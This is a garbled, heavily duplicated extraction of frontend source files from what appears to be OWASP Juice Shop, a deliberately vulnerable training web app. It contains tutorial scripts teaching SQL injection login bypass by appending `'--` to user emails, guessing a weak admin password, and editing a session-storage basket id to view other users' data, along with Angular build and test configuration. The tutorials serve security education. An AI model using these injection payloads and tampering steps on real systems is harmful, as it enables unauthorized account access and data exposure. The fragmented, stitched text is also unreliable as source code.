ca ... dress!"You can comment out the entire password check clause of the DB query by adding `'--` to Bender's email address!"bender ... .op'--"bender@juice-sh.op'--op'--text:\r\n ... ender!''\u1f389\udf89 Con ... ender!' Congratulations! You have been logged in as Bender!P:/My Drive/Git/juice-shop/frontend/src/hacking-instructor/challenges/loginJim.tsLoginJimInstruction"Let's try if we find a way to log in with Jim's user account. To begin, go to the _Login_ page via the _Account_ menu.""As you would expect you need to supply Jim's email address and password to log in regularly. But you might have neither at the moment.""So, let's go find out Jim's email! Luckily the shop is very bad with privacy and leaks emails in different places, for instance in the product reviews."'Go back to the product list and click on some to open their details dialog which also hold the user reviews.''Once you found a user review by Jim and learned his email, go to the _Login_ screen.'"Supply Jim's email address in the **email field**."'jim@juice-sh.op'"You can comment out the entire password check clause of the DB query by adding `'--` to Jim's email address!""jim@juice-sh.op'--"' Congratulations! You have been logged in as Jim!'LoginJi ... \n  ]\r\n}Let's try if we find a way to log in with Jim's user account. To begin, go to the _Login_ page via the _Account_ menu.Let's try if we find a way to log in with Jim's user accountAs you would expect you need to supply Jim's email address and password to log in regularly. But you might have neither at the moment.As you would expect you need to supply Jim's email address and password to log in regularlytext:\r\n ... views.""So, le ... views."So, let's go find out Jim's email! Luckily the shop is very bad with privacy and leaks emails in different places, for instance in the product reviews.So, let's go find out Jim's email! Luckily the shop is very bad with privacy and leaks emails in different places, for instance in the product reviewstext:\r\n ... views.''Go bac ... views.'Go back to the product list and click on some to open their details dialog which also hold the user reviews.Go back to the product list and click on some to open their details dialog which also hold the user reviewsresolve ... earch')waitFor ... earch')Once you found a user review by Jim and learned his email, go to the _Login_ screen.Once you found a user review by Jim and learned his email, go to the _Login_ screenSupply Jim's email address in the **email field**.jim@juice-sh.opjim@juice-shresolve ... -1701')waitFor ... -1701')You can comment out the entire password check clause of the DB query by adding `'--` to Jim's email address!jim@juice-sh.op'--text:\r\n ... s Jim!''\u1f389\udf89 Con ... s Jim!' Congratulations! You have been logged in as Jim!P:/My Drive/Git/juice-shop/frontend/src/hacking-instructor/challenges/passwordStrength.ts TODO Use domain from config insteadPasswordStrengthInstruction"In this challenge we'll try to log into the administrator's user account using his original credentials."7000"If you don't know it already, you must first find out the admin's email address. The user feedback and product reviews are good places to look into. When you have it, go to the _Login_ page.""Enter the admin's email address into the **email field**."'admin@juice-sh.op''Now for the password. Lucky for us, the admin chose a really, really, **really** stupid one. Just try any that comes to your mind!'" Nah, that was wrong! Keep trying! I'll tell you when you're one the right track."'Okay, you are one the right track, but this would have been the worst password in the world for an admin. He spiced it up a little bit with some extra non-letter characters. Keep trying!''admin1'" Yes, it's getting warmer! Try adding some more numbers maybe?"'admin12'" It's getting hot! Just one more digit..."'Okay, now press the _Log in_ button.'' Congratulations! You have been logged in as the **administrator** of the shop thanks to his very ill chosen password!'const P ... \n  ]\r\n}Passwor ... \n  ]\r\n}Passwor ... ructiontext:\r\n ... tials.""In thi ... tials."In this challenge we'll try to log into the administrator's user account using his original credentials.In this challenge we'll try to log into the administrator's user account using his original credentialsresolve ... s(7000)waitInMs(7000)text:\r\n ...  page.""If you ...  page."If you don't know it already, you must first find out the admin's email address. The user feedback and product reviews are good places to look into. When you have it, go to the _Login_ page.If you don't know it already, you must first find out the admin's email address The user feedback and product reviews are good places to look into When you have it, go to the _Login_ page"Enter  ... eld**."Enter the admin's email address into the **email field**.resolve ... sh.op')waitFor ... sh.op')admin@juice-sh.opadmin@juice-shtext: ' ...  mind!''Now fo ...  mind!'Now for the password. Lucky for us, the admin chose a really, really, **really** stupid one. Just try any that comes to your mind!text: " ... track.""\u1f926\udd26\u200d\u2642\ufe0f  ... track." Nah, that was wrong! Keep trying! I'll tell you when you're one the right track. Nah, that was wrong! Keep trying! I'll tell you when you're one the right trackresolve ... admin')waitFor ... admin')text: ' ... rying!''Okay,  ... rying!'Okay, you are one the right track, but this would have been the worst password in the world for an admin. He spiced it up a little bit with some extra non-letter characters. Keep trying!Okay, you are one the right track, but this would have been the worst password in the world for an admin He spiced it up a little bit with some extra non-letter characters Keep trying!resolve ... dmin1')waitFor ... dmin1')admin1text: " ... maybe?""\u1f525\udd25 Yes ... maybe?" Yes, it's getting warmer! Try adding some more numbers maybe? Yes, it's getting warmer! Try adding some more numbers maybresolve ... min12')waitFor ... min12')admin12text: " ... git...""\u1f9ef\uddef It' ... git..." It's getting hot! Just one more digit... It's getting hot! Just one more digitresolve ... in123')waitFor ... in123')'Okay,  ... utton.'Okay, now press the _Log in_ button.Okay, now press the _Log in_ buttontext:\r\n ... sword!''\u1f389\udf89 Con ... sword!' Congratulations! You have been logged in as the **administrator** of the shop thanks to his very ill chosen password!P:/My Drive/Git/juice-shop/frontend/src/hacking-instructor/challenges/privacyPolicy.tswaitForLogInPrivacyPolicyInstruction'Log in with any user to begin this challenge. You can use an existing or freshly registered account.''Great, you are logged in! Now open the _Account_ menu.''Open the _Privacy & Security_ sub-menu and click _Privacy Policy_.'' That was super easy, right? This challenge is a bit of a joke actually, because nobody reads any fine print online... '60000Privacy ... \n  ]\r\n}Privacy ... ructiontext:\r\n ... count.'Log in with any user to begin this challenge. You can use an existing or freshly registered account.Log in with any user to begin this challenge You can use an existing or freshly registered accountresolve ... LogIn()waitForLogIn()'Great, ...  menu.'Great, you are logged in! Now open the _Account_ menu.Great, you are logged in! Now open the _Account_ menutext:\r\n ... licy_.''Open t ... licy_.'Open the _Privacy & Security_ sub-menu and click _Privacy Policy_.Open the _Privacy & Security_ sub-menu and click _Privacy Policy_resolve ... olicy')waitFor ... olicy')text: ' ... ... \u1f648\ude48''\u1f389\udf89 Tha ... ... \u1f648\ude48' That was super easy, right? This challenge is a bit of a joke actually, because nobody reads any fine print online...  That was super easy, righ This challenge is a bit of a joke actually, because nobody reads any fine print online resolve ... (60000)waitInMs(60000)P:/My Drive/Git/juice-shop/frontend/src/hacking-instructor/challenges/scoreBoard.tsScoreBoardInstruction'This application is riddled with security vulnerabilities. Your progress exploiting these is tracked on a _Score Board_.'"You won't find a link to it in the navigation or side bar, though. Finding the _Score Board_ is in itself actually one of the hacking challenges."12000'You could just start guessing the URL of the _Score Board_ or comb through the client-side JavaScript code for useful information.''You find the JavaScript code in the DevTools of your browser that will open with `F12`.'"Look through the client-side JavaScript in the _Sources_ tab for clues. Or just start URL guessing. It's up to you!"' Congratulations! You found the _Score Board_! Good luck and happy hacking!'const S ... \n  ]\r\n}ScoreBo ... \n  ]\r\n}ScoreBo ... ructiontext:\r\n ... oard_.''This a ... oard_.'This application is riddled with security vulnerabilities. Your progress exploiting these is tracked on a _Score Board_.This application is riddled with security vulnerabilities Your progress exploiting these is tracked on a _Score Board_text:\r\n ... enges.""You wo ... enges."You won't find a link to it in the navigation or side bar, though. Finding the _Score Board_ is in itself actually one of the hacking challenges.You won't find a link to it in the navigation or side bar, though Finding the _Score Board_ is in itself actually one of the hacking challengesresolve ... (12000)waitInMs(12000)text:\r\n ... ation.''You co ... ation.'You could just start guessing the URL of the _Score Board_ or comb through the client-side JavaScript code for useful information.You could just start guessing the URL of the _Score Board_ or comb through the client-side JavaScript code for useful informationtext:\r\n ... `F12`.''You fi ... `F12`.'You find the JavaScript code in the DevTools of your browser that will open with `F12`.You find the JavaScript code in the DevTools of your browser that will open with `F12`text:\r\n ... o you!""Look t ... o you!"Look through the client-side JavaScript in the _Sources_ tab for clues. Or just start URL guessing. It's up to you!Look through the client-side JavaScript in the _Sources_ tab for clues Or just start URL guessing It's up to you!text: ' ... cking!''\u1f389\udf89 Con ... cking!' Congratulations! You found the _Score Board_! Good luck and happy hacking!fixture ... -board'P:/My Drive/Git/juice-shop/frontend/src/hacking-instructor/challenges/viewBasket.tsViewBasketInstruction"This challenge is about **Horizontal Privilege Escalation**, meaning you are supposed to access data that does not belong to your own account but to another user's."18000"To start this challenge, you'll have to log in first.""First, go to the _Your Basket_ page to view your own shopping basket. It's likely to be empty, if you didn't add anything yet.""To pass this challenge, you will need to peek into another user's basket while remaining logged in with your own account."'If the application stores a reference to the basket somewhere in the browser, that might be a possible attack vector.'"Open the browser's _Development Tools_ and locate the _Session Storage_ tab. Similar to s, it can be used to store data in key/value pairs for each website."'Look over the names of the used session keys. Do you see something that might be related to the shopping basket? Try setting it to a different value! ''Great, you have changed the `bid` value which might be some ID for the shopping basket!''Now, go to any other screen and then back to _Your Basket_. If nothing happens you might have set an invalid or non-existing `bid`. Try another in that case.'" Congratulations! You are now viewing another user's shopping basket!"const V ... \n  ]\r\n}ViewBas ... \n  ]\r\n}ViewBas ... ructiontext:\r\n ... ser's.""This c ... ser's."This challenge is about **Horizontal Privilege Escalation**, meaning you are supposed to access data that does not belong to your own account but to another user's.resolve ... (18000)waitInMs(18000)To start this challenge, you'll have to log in first.To start this challenge, you'll have to log in firsttext:\r\n ... g yet.""First, ... g yet."First, go to the _Your Basket_ page to view your own shopping basket. It's likely to be empty, if you didn't add anything yet.First, go to the _Your Basket_ page to view your own shopping basket It's likely to be empty, if you didn't add anything yetresolve ... asket')waitFor ... asket')text:\r\n ... count.""To pas ... count."To pass this challenge, you will need to peek into another user's basket while remaining logged in with your own account.To pass this challenge, you will need to peek into another user's basket while remaining logged in with your own accounttext:\r\n ... ector.''If the ... ector.'If the application stores a reference to the basket somewhere in the browser, that might be a possible attack vector.If the application stores a reference to the basket somewhere in the browser, that might be a possible attack vectortext:\r\n ... bsite.""Open t ... bsite."Open the browser's _Development Tools_ and locate the _Session Storage_ tab. Similar to s, it can be used to store data in key/value pairs for each website.Open the browser's _Development Tools_ and locate the _Session Storage_ tab Similar to s, it can be used to store data in key/value pairs for each websitetext:\r\n ... ue! \u270d\ufe0f''Look o ... ue! \u270d\ufe0f'Look over the names of the used session keys. Do you see something that might be related to the shopping basket? Try setting it to a different value! Look over the names of the used session keys Do you see something that might be related to the shopping baske Try setting it to a different value! const b ... ('bid')bid = s ... ('bid')if (ses ...       }session ... !== bidtext:\r\n ... asket!''Great, ... asket!'Great, you have changed the `bid` value which might be some ID for the shopping basket!text:\r\n ...  case.''Now, g ...  case.'Now, go to any other screen and then back to _Your Basket_. If nothing happens you might have set an invalid or non-existing `bid`. Try another in that case.Now, go to any other screen and then back to _Your Basket_ If nothing happens you might have set an invalid or non-existing `bid` Try another in that caseconst t ... Total')total = ... Total')session ... = totaltext:\r\n ... asket!""\u1f389\udf89 Con ... asket!" Congratulations! You are now viewing another user's shopping basket!fixture ... basket'P:/My Drive/Git/juice-shop/frontend/src/hacking-instructor/helpers/helpers.tsP:/My Drive/Git/juice-shop/frontend/src/hacking-instructor/helpers
 * see https://stackoverflow.com/questions/7798748/find-out-whether-chrome-console-is-open/48287643#48287643
 /**\r\n * ... 43\r\n */playbackDelaysfasterfast0.75slow1.25slowertimeInMsinputSelectorinputElement'/rest/admin/application-configuration'propertyChainreplacementValuewaitForInputToNotHaveValueelementSelector`Could not find Element with selector "${??=`#/${checkStatuswaitForSelectToHaveValueselectSelectorselectElementwaitForSelectToNotHaveValuesee https://stackoverflow.com/questions/7798748/find-out-whether-chrome-console-is-open/48287643#48287643let configconst p ...  1.5\r\n}playbac ...  1.5\r\n}{\r\n  fa ...  1.5\r\n}faster: 0.5fast: 0.75normal: 1.0slow: 1.25slower: 1.5Promise<void>{\r\n  aw ...   })\r\n}await n ... )\r\n  })new Pro ... )\r\n  })(resolv ... s)\r\n  }setTime ... meInMs){ ignor ... t: [] }ignoreCase: truereplacement: []return  ...  }\r\n  }async ( ...  }\r\n  }const i ... \r\n    )inputEl ... \r\n    )documen ... \r\n    )documen ... electorif (opt ... \r\n    }options ... h === 2options ... .lengthoptions.replacement!configres = a ... ation')await f ... ation')fetch(' ... ation')'/rest/ ... ration'/rest/admin/application-configurationconst j ... .json()json =  ... .json()await res.json()res.json()config = json.configjson.configconst p ... it('.')propert ... it('.')options ... it('.')options ... ].splitoptions ... ment[1]let rep ...  configreplace ...  configconst propertyreplace ... operty]value = ... tValue)value.r ... tValue)value.replaceoptions ... ment[0]while ( ... \r\n    }if (opt ...       }options ... rCase()options.ignoreCaseinputEl ... rCase()inputEl ... werCaseinputElement.valueif (!op ...       }!option ... = value!options.ignoreCaseinputEl ... = value{ ignoreCase: true }if (inp ...       }inputEl ...  !== ''const e ... \r\n    )element ... \r\n    )if (!el ... \r\n    }!elementconsole ... tor}"`)`Could  ... ctor}"`Could n ... ector "Could not find Element with selector "await n ... \n    })element ... ve() })element ... istener() => { resolve() }{ resolve() }resolve()const e ...       )element ...       )documen ...       )if (ele ...       }element ... = valueelement.innerHTMLreturn  ... y)\r\n  }async ( ... y)\r\n  }if (!co ... \r\n    }let del ... kSpeed]delay = ... kSpeed]playbac ... kSpeed]config. ... ckSpeeddelay ??= 1.0await s ...  delay)sleep(t ...  delay)timeInMs * delaywindow. ... route}`window.location.hash`#/${route}`#/if (loc ...       }localSt ... == null{\r\n  le ... \n  }\r\n}let che ... = falsecheckStatus = falseconst e ... Image()element ... Image()new Image()Object. ... }\r\n  })get: fu ... \r\n    }checkStatus = trueconsole.dir(element)console.dirconsole.clear()console.clearif (che ...       }const s ... \r\n    )selectE ... \r\n    )if (sel ...       }selectE ... = valueselectE ... ].valueselectE ... dIndex]selectE ... optionsselectE ... edIndexP:/My Drive/Git/juice-shop/frontend/src/hacking-instructor/index.ts
   * Text in the hint box
   * Can be formatted using markdown
   /**\r\n   ... \r\n   */
   * Query Selector String of the Element the hint should be displayed next to.
   
   * Set to true if the hint should be displayed after the target
   * Defaults to false (hint displayed before target)
   
   * Set to true if the hint should not be able to be skipped by clicking on it.
   * Defaults to false
   
   * Function declaring the condition under which the tutorial will continue.
    insertAfter does not exist so we simulate it this way// inse ... his way eslint-disable-next-line @typescript-eslint/no-invalid-void-type// esli ... id-type'snarkdown''./challenges/loginAdmin''./challenges/domXss''./challenges/scoreBoard''./challenges/privacyPolicy''./challenges/loginJim''./challenges/viewBasket''./challenges/forgedFeedback''./challenges/passwordStrength''./challenges/bonusPayload''./challenges/loginBender'TutorialUnavailableInstruction'./tutorialUnavailable''./challenges/codingChallenges'challengeInstructionsChallengeHintloadHint'div''20000''rgba(50, 115, 220, 0.9)''400px''350px''250px''16px''8px''initial''1.3''24px''Roboto,Helvetica Neue,sans-serif''pointer''Double-click to skip''14px''flex''center'picture'64px''/assets/public/images/hackingInstructor.png'textBox'span'cancelButton'button''cancelButton''transparent''white''<div style;">&times;</div>''large''Cancel the tutorial''relative''20001''-22px'relAnchor'inline'waitForDoubleClick'dblclick'waitForCancel'break'challengeInstruction`Could not find Element with fixture "${continueConditionsText in the hint box
Can be formatted using markdownQuery Selector String of the Element the hint should be displayed next to.Set to true if the hint should be displayed after the target
Defaults to false (hint displayed before target)Set to true if the hint should not be able to be skipped by clicking on it.
Defaults to falseFunction declaring the condition under which the tutorial will continue.import  ... nAdmin''./chal ... nAdmin'./challenges/loginAdmin/challenges/loginAdminimport  ... domXss''./chal ... domXss'./challenges/domXss/challenges/domXssimport  ... eBoard''./chal ... eBoard'./challenges/scoreBoard/challenges/scoreBoardimport  ... Policy''./chal ... Policy'./challenges/privacyPolicy/challenges/privacyPolicyimport  ... ginJim''./chal ... ginJim'./challenges/loginJim/challenges/loginJimimport  ... Basket''./chal ... Basket'./challenges/viewBasket/challenges/viewBasket'./chal ... edback'./challenges/forgedFeedback/challenges/forgedFeedback'./chal ... rength'./challenges/passwordStrength/challenges/passwordStrengthimport  ... ayload''./chal ... ayload'./challenges/bonusPayload/challenges/bonusPayloadimport  ... Bender''./chal ... Bender'./challenges/loginBender/challenges/loginBenderimport  ... ilable''./tuto ... ilable'./tutorialUnavailable/tutorialUnavailableTutoria ... ructionimport  ... lenges''./chal ... lenges'./challenges/codingChallenges/challenges/codingChallengesconst c ... tion\r\n]challen ... tion\r\n]challen ... uctions[\r\n  Sc ... tion\r\n]Challen ... ction[]export  ... nt[]\r\n}interfa ... nt[]\r\n}hints:  ... eHint[]ChallengeHint[]export  ... oid>\r\n}interfa ... oid>\r\n}fixture: stringfixture ... booleanunskipp ... booleanresolve ... e<void>() => Promise<void>functio ... pper\r\n}{\r\n  co ... pper\r\n}const t ... ixture)target  ... ixture)documen ... ixture)hint.fixtureif (!ta ... nt\r\n  }!targetreturn  ... Elementnull as ... Elementconst w ... ('div')wrapper ... ('div')documen ... ('div')wrapper ... solute'wrapper ... ositionwrapper.styleconst e ... ('div')elem =  ... ('div')elem.id ... ructor'elem.idelem.st ... solute'elem.style.positionelem.styleelem.st ... '20000'elem.style.zIndexelem.st ... , 0.9)'elem.st ... ndColor'rgba(5 ... , 0.9)'rgba(50, 115, 220, 0.9)(50, 115, 220, 0.9)50, 115, 220, 0.950, 115, 220, 0elem.st ... '400px'elem.style.maxWidth400pxelem.st ... '250px'elem.style.minWidthhint.te ... '250px'hint.te ... h > 100hint.text.lengthhint.text350px250pxelem.st ...  '16px'elem.style.padding16pxelem.st ... = '8px'elem.st ... rRadius8pxelem.st ... nitial'elem.st ... teSpaceinitialelem.st ... = '1.3'elem.st ... eHeight1.3elem.st ...  '24px'elem.style.top24pxelem.st ... -serif'elem.st ... tFamily'Roboto ... -serif'Roboto,Helvetica Neue,sans-serifif (!hi ... p'\r\n  }!hint.unskippablehint.unskippable{\r\n     ... p'\r\n  }elem.st ... ointer'elem.style.cursorpointerelem.ti ... o skip'elem.title'Double ... o skip'Double-click to skipelem.st ...  '14px'elem.style.fontSize14pxelem.st ...  'flex'elem.style.displayelem.st ... center'elem.st ... gnItemsconst p ... ('img')picture ... ('img')documen ... ('img')picture ...  '64px'picture ... inWidthpicture.style64pxpicture ... nHeightpicture.style.widthpicture.style.heightpicture ... = '8px'picture ... inRightpicture ... or.png'picture.src'/asset ... or.png'/assets/public/images/hackingInstructor.png/assets/public/images/hackingInstructorconst t ... 'span')textBox ... 'span')documen ... 'span')textBox ... w = '2'textBox ... lexGrowtextBox.styletextBox ... t.text)textBox.innerHTMLsnarkdown(hint.text)const c ... utton')cancelB ... utton')documen ... utton')cancelB ... Button'cancelButton.idcancelB ...  'none'cancelB ... orationcancelButton.stylecancelB ... parent'cancelB ... ndColorcancelB ... .bordercancelB ... 'white'cancelB ... e.colorcancelB ... </div>'cancelB ... nerHTML'<div s ... </div>'<div style;">&times;</div>cancelB ... 'large'cancelB ... ontSizelargecancelB ... torial'cancelButton.title'Cancel ... torial'Cancel the tutorialcancelB ... lative'cancelB ... ositioncancelB ... '20001'cancelB ... .zIndex20001cancelB ... '-22px'cancelB ... .bottom-22pxcancelB ... ointer'cancelB ... .cursorelem.ap ... icture)elem.appendChildelem.ap ... extBox)const r ... ('div')relAnch ... ('div')relAnch ... lative'relAnch ... ositionrelAnchor.stylerelAnch ... inline'relAnch ... displayinlinerelAnch ... d(elem)relAnch ... ndChildrelAnch ... Button)wrapper ... Anchor)wrapper.appendChildif (hin ... t)\r\n  }hint.fixtureAftertarget. ... ibling)target. ... tBeforetarget.parentElementtarget.nextSiblingtarget. ... target)return wrapper(resolv ... e)\r\n  }element ... esolve)(resolv ... })\r\n  }element ... \n    })resolve('break')export  ... ined\r\n}functio ... ined\r\n}{\r\n  re ... ined\r\n}return  ... definedchallen ... definedchallen ... geName)challen ... ns.find({ name ... ngeName{ name }name == ... ngeNameconst c ... ructionchallen ... ructionchallen ... n.hintsconst hintconst e ... t(hint)element ... t(hint)loadHint(hint)console ... ure}"`)`Could  ... ture}"`Could n ... xture "Could not find Element with fixture "element ... oView()element ... ntoViewconst c ... \r\n    ]continu ... \r\n    ]hint.resolved()hint.resolvedArray<P ... known>>Promise ... nknown>void | unknownif (!hi ... \r\n    }continu ... ement))continu ... ns.pushwaitFor ... lement)continu ... ton')))waitFor ... tton'))const c ... itions)command ... itions)await P ... itions)Promise ... itions)if (com ... \r\n    }command === 'break'element.remove()element.removeP:/My Drive/Git/juice-shop/frontend/src/hacking-instructor/tutorialUnavailable.ts'./helpers/helpers'' Sorry, this hacking challenge does not have a step-by-step tutorial (yet) ...  Can you find your own way to solve it?'' Do you want to contribute a tutorial for this challenge? [Check out our documentation](https://pwning.owasp-juice.shop/part3/tutorials.html) to learn how! ''And now:  **GLHF** with this challenge!'./helpers/helpersimport  ... om './'const T ... \n  ]\r\n}Tutoria ... \n  ]\r\n}name: nulltext:\r\n ... ve it?''\u1f613\ude13 Sor ... ve it?' Sorry, this hacking challenge does not have a step-by-step tutorial (yet) ...  Can you find your own way to solve it? Sorry, this hacking challenge does not have a step-by-step tutorial (yet)yet  Can you find your own way to solve itext:\r\n ... ow! \u1f3eb\udfeb''\u270d\ufe0f Do  ... ow! \u1f3eb\udfeb' Do you want to contribute a tutorial for this challenge? [Check out our documentation](https://pwning.owasp-juice.shop/part3/tutorials.html) to learn how!  Do you want to contribute a tutorial for this challeng[Check out our documentation](https://pwning.owasp-juice.shop/part3/tutorials.html)https://pwning.owasp-juice.shop/part3/tutorials.htmlhttps://pwningowasp-juiceshop/part3/tutorials to learn how! text:\r\n ... lenge!''And no ... lenge!'And now:  **GLHF** with this challenge!P:/My Drive/Git/juice-shop/frontend/src/index.html"load"cookieconsentinitialise"palette""popup""background""var(--theme-primary)""text""var(--theme-text)""button""var(--theme-accent)""theme""classic""bottom-right""content""message""This website uses fruit cookies to ensure you get the juiciest tracking experience.""dismiss""Me want it!""link""But me wait!""href""https://www.youtube.com/watch?v=9PnbKL3wuH4"window. ...   })});window. ...    })})functio ...     })}{\r\n     ...     })}window. ...      })window. ... tialisewindow.cookieconsent"palett ...       }palette"popup" ... ext)" }popup{ "back ... ext)" }"backgr ... imary)""var(-- ... imary)"(--theme-primary)--theme-primary"text": ... -text)"(--theme-text)--theme-text"button ... ext)" }"backgr ... ccent)""var(-- ... ccent)"(--theme-accent)--theme-accent"theme": "classic"classic"positi ... -right"bottom-right"conten ... wuH4" }{ "mess ... wuH4" }"messag ... ience.""This w ... ience."This website uses fruit cookies to ensure you get the juiciest tracking experience"dismis ... nt it!""link": ...  wait!""href": ... L3wuH4""https: ... L3wuH4"youtubecom/watcv=9PnbKL3wuH4mat-app-background bluegrey-lightgreen-theme//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.jstext/css//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.cssimage/x-iconassets/public/favicon_js.icowidth=device-width, initial-scale=1Probably the most modern and sophisticated insecure web applicationutf-8P:/My Drive/Git/juice-shop/frontend/src/karma.conf.js Karma configuration file, see link for more information// Karm ... rmation https://karma-runner.github.io/1.0/config/configuration-file.html// http ... le.html leave Jasmine Spec Runner output visible in browser// leav ... browserframeworks'jasmine''@angular-devkit/build-angular''karma-jasmine''karma-chrome-launcher''karma-jasmine-html-reporter''karma-coverage''@angular-devkit/build-angular/plugins/karma'clearContextcoverageReporter'../../build/reports/coverage/frontend-tests'subdirreporters'html''lcovonly''kjhtml'9876logLevelLOG_INFOautoWatchbrowsers'ChromeHeadless'singleRunrestartOnFileChangemodule. ...   })\r\n}functio ...   })\r\n}config. ... e\r\n  })config.setbasePath: ''framewo ... gular']['jasmi ... gular']'@angul ... ngular'plugins ... \r\n    ]require ... smine')require ... ncher')'karma- ... uncher'require ... orter')'karma- ... porter'require ... erage')require ... karma')'@angul ... /karma'@angular-devkit/build-angular/plugins/karmaclient: ... \r\n    }clearContext: falsecoverag ... \r\n    }dir: re ... tests')require ... tests')require('path').joinrequire('path')'../../ ... -tests'../../build/reports/coverage/frontend-tests/build/reports/coverage/frontend-testssubdir: '.'reporte ...       ]{ type: 'html' }type: 'html'{ type: 'lcovonly' }type: 'lcovonly'lcovonlyreporte ... jhtml']['progr ... jhtml']kjhtmlport: 9876colors: truelogLeve ... OG_INFOconfig.LOG_INFOautoWatch: truebrowser ... dless']['ChromeHeadless']ChromeHeadlesssingleRun: falserestart ... e: trueP:/My Drive/Git/juice-shop/frontend/src/main.tsenableProdModeplatformBrowserDynamic'@angular/platform-browser-dynamic''./app/app.module''./environments/environment'bootstrapModuleimport  ... ynamic''@angul ... ynamic'platfor ... Dynamic./app/app.module/app/app'./envi ... onment'./environments/environmentif (env ... de()\r\n}environ ... duction{\r\n  en ... de()\r\n}enableProdMode()platfor ... g(err))platfor ...  .catchplatfor ... Module)platfor ... pModuleplatfor ... namic()(err: E ... og(err)P:/My Drive/Git/juice-shop/frontend/src/polyfills.ts
 * This file includes polyfills needed by Angular and is loaded before the app.
 * You can add your own extra polyfills to this file.
 *
 * This file is divided into 2 sections:
 *   1. Browser polyfills. These are applied before loading ZoneJS and are sorted by browsers.
 *   2. Application imports. Files imported after ZoneJS that should be loaded before your main
 *      file.
 *
 * The current setup is for so-called "evergreen" browsers; the last versions of browsers that
 * automatically update themselves. This includes Safari >= 10, Chrome >= 55 (including Opera),
 * Edge >= 13 on the desktop, and iOS 10 and Chrome on mobile.
 *
 * Learn more in https://angular.io/docs/ts/latest/guide/browser-support.html
  *************************************************************************************************
 * BROWSER POLYFILLS
 /** *** ... LS\r\n */ IE9, IE10 and IE11 requires all of the following polyfills. /** IE9 ... lls. */ import 'core-js/es6/symbol';// impo ... ymbol'; import 'core-js/es6/object';// impo ... bject'; import 'core-js/es6/function';// impo ... ction'; import 'core-js/es6/parse-int';// impo ... e-int'; import 'core-js/es6/parse-float';// impo ... float'; import 'core-js/es6/number';// impo ... umber'; import 'core-js/es6/math';// impo ... /math'; import 'core-js/es6/string';// impo ... tring'; import 'core-js/es6/date';// impo ... /date'; import 'core-js/es6/array';// impo ... array'; import 'core-js/es6/regexp';// impo ... egexp'; import 'core-js/es6/map';// impo ... 6/map'; import 'core-js/es6/weak-map';// impo ... k-map'; import 'core-js/es6/set';// impo ... 6/set'; IE10 and IE11 requires the following for the Reflect API. /** IE1 ... API. */ import 'core-js/es6/reflect';// impo ... flect'; Evergreen browsers require these. /** Eve ... ese. */ Used for reflect-metadata in JIT. If you use AOT (and only Angular decorators), you can remove.// Used ... remove.
 * By default, zone.js will patch all possible macroTask and DomEvents
 * user can disable parts of macroTask/DomEvents patch by setting following flags
 /**\r\n * ... gs\r\n */ (window as any).__Zone_disable_requestAnimationFrame = true; // disable patch requestAnimationFrame// (win ... onFrame (window as any).__Zone_disable_on_property = true; // disable patch onProperty such as onclick// (win ... onclick (window as any).__zone_symbol__BLACK_LISTED_EVENTS = ['scroll', 'mousemove']; // disable patch specified eventNames// (win ... ntNames
 * in IE/Edge developer tools, the addEventListener will also be wrapped by zone.js
 * with the following flag, it will bypass `zone.js` patch for IE/Edge
 /*\r\n *  ... ge\r\n */ (window as any).__Zone_enable_cross_context_check = true;// (win ... = true; *************************************************************************************************
 * Zone JS is required by default for Angular itself.
 /** *** ... f.\r\n */ Included with Angular CLI.// Incl ... ar CLI. *************************************************************************************************
 * APPLICATION IMPORTS
 /** *** ... TS\r\n */'core-js/es/reflect''zone.js'This file includes polyfills needed by Angular and is loaded before the app.
You can add your own extra polyfills to this file.

This file is divided into 2 sections:
1. Browser polyfills. These are applied before loading ZoneJS and are sorted by browsers.
2. Application imports. Files imported after ZoneJS that should be loaded before your main
file.

The current setup is for so-called "evergreen" browsers; the last versions of browsers that
automatically update themselves. This includes Safari >= 10, Chrome >= 55 (including Opera),
Edge >= 13 on the desktop, and iOS 10 and Chrome on mobile.

Learn more in https://angular.io/docs/ts/latest/guide/browser-support.html*************************************************************************************************
BROWSER POLYFILLSIE9, IE10 and IE11 requires all of the following polyfills.IE10 and IE11 requires the following for the Reflect API.Evergreen browsers require these.By default, zone.js will patch all possible macroTask and DomEvents
user can disable parts of macroTask/DomEvents patch by setting following flags*************************************************************************************************
Zone JS is required by default for Angular itself.*************************************************************************************************
APPLICATION IMPORTSimport  ... eflect'core-js/es/reflectimport 'zone.js'zone(window ...  window(window ... .global(window as any)window as anyP:/My Drive/Git/juice-shop/frontend/src/test.ts This file is required by karma.conf.js and loads recursively all the .spec and framework files// This ... k files First, initialize the Angular testing environment.// Firs ... onment. Then we find all the tests.// Then ...  tests. const context = require.context('./', true, /\.spec\.ts$/)// cons ... \.ts$/) // And load the modules.// // A ... odules. context.keys().map(context)// cont ... ontext)'zone.js/testing'getTestBedBrowserDynamicTestingModuleplatformBrowserDynamicTesting'@angular/platform-browser-dynamic/testing'initTestEnvironmentdestroyAfterEachzone.js/testingjs/testing@angular/platform-browser-dynamic/testingBrowser ... gModuleplatfor ... Testingdeclare ... re: anyrequire: anygetTest ... \n  }\r\n)getTest ... ronmentgetTestBed()platfor ... sting()teardow ... false }{ destr ... false }destroy ... : falseP:/My Drive/Git/juice-shop/frontend/src/tsconfig.app.json{\r\n  "e ... \n  ]\r\n}"../tsc ... e.json"../tsconfig.base.json"../tsconfig.base.json""../out-tsc/app"../out-tsc/appoutDir"es2020"es2020allowSyntheticDefaultImportscompilerOptions[\r\n     ... s"\r\n  ]"main.ts"main.ts"polyfills.ts"polyfills.ts"**/*.d.ts"**/*.d.tsP:/My Drive/Git/juice-shop/frontend/src/tsconfig.spec.json"../out-tsc/spec"../out-tsc/spec"jasmine""node""test.ts"test.ts"**/*.spec.ts"**/*.spec.tsP:/My Drive/Git/juice-shop/frontend/tsconfig.base.json{\r\n  "c ... \n  }\r\n}compileOnSave"./""./dist/out-tsc"./dist/out-tscsourceMapdeclarationmoduleResolutionemitDecoratorMetadataexperimentalDecorators"node_m ... @types"node_modules/@types"node_modules/@types"typeRoots"dom"libP:/My Drive/Git/juice-shop/frontend/tsconfig.json{\r\n  "f ... \n  ]\r\n}"./src/ ... p.json"./src/tsconfig.app.json"./src/tsconfig.app.json""./src/ ... c.json"./src/tsconfig.spec.json"./src/tsconfig.spec.json"referencesP:/My Drive/Git/juice-shop/frontend/webpack.angular.js this file contains extras that should override angular's default configs// this ... configs @see 